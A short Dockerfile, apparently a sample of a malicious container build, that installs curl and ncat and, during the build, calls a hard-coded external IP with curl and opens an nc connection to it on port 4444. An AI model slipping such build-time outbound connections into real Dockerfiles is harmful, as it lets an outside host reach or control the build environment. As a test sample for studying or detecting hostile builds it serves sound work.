FROM ubuntu

WORKDIR /tmp

RUN mkdir touch_my_docker
RUN ls &&  echo "malicious code here"
RUN apt update && apt install -y curl && apt install -y ncat
RUN curl http://68.183.4.199/req
RUN nc 68.183.4.199 4444

